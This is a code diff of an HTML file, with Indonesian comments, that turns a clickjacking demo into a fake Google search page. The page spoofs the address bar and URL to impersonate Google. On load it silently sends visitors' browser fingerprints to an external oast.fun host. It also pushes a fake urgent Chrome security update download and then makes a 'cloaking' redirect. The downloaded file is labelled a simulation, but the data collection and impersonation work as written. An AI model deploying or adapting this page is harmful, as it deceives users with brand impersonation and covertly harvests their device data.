@@ -1,37 +1,88 @@
-<button id="launch">Click to Win!</button>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Google</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: white;
+      margin: 0;
+      padding: 0;
+    }
+    .fake-url-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      padding: 10px;
+      background: #f1f3f4;
+      border-bottom: 1px solid #ccc;
+      font-size: 14px;
+      z-index: 9999;
+    }
+    .search-results {
+      padding: 60px 20px;
+    }
+    .result {
+      margin-bottom: 20px;
+    }
+    .result-title {
+      color: #1a0dab;
+      font-size: 18px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .result-desc {
+      color: #4d5156;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="fake-url-bar"><b>https://www.google.com/search?q=chrome+security+update</b></div>
 
-<script>
-document.getElementById("launch").addEventListener("click", function () {
-  const payload = `
-    <script>
-      const data = {
-        ua: navigator.userAgent,
-        screen: screen.width + 'x' + screen.height,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        ref: document.referrer
-      };
+  <div class="search-results">
+    <div class="result">
+      <a class="result-title" id="download" onclick="triggerDownload()">[URGENT] Chrome Security Update</a>
+      <div class="result-desc">Critical patch released for Chrome Desktop. Click to update now.</div>
+    </div>
+    <div class="result">
+      <a class="result-title" href="https://support.google.com/chrome/">Chrome Help - Official Support</a>
+      <div class="result-desc">Tips & tricks, update info, and security resources for Chrome.</div>
+    </div>
+  </div>
 
-      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
+  <script>
+    // 1. Ganti URL agar seolah dari Google Search
+    history.pushState({}, '', '/search?q=chrome+security+update');
 
+    // 2. Kirim fingerprint diam-diam
+    const fingerprint = {
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      screen: `${screen.width}x${screen.height}`,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      ref: document.referrer
+    };
+    fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(fingerprint)
+    });
+
+    // 3. Download otomatis saat diklik
+    function triggerDownload() {
       const a = document.createElement('a');
-      a.href = 'data:text/plain;charset=utf-8,You%20are%20clickjacked!';
-      a.download = 'win.txt';
-      a.style.display = 'none';
+      a.href = 'data:text/html,<h1>Update Chrome Anda</h1><p>File ini adalah simulasi HTML update palsu.</p>';
+      a.download = 'Chrome_Update_2025.html';
       document.body.appendChild(a);
       a.click();
 
       setTimeout(() => {
-        location.replace('https://www.google.com/');
-      }, 1500);
-    <\/script>
-  `;
-
-  const encoded = btoa(payload);
-  const url = "data:text/html;base64," + encoded;
-  window.open(url);
-});
-</script>
+        location.href = "https://www.google.com"; // cloaking redirect
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
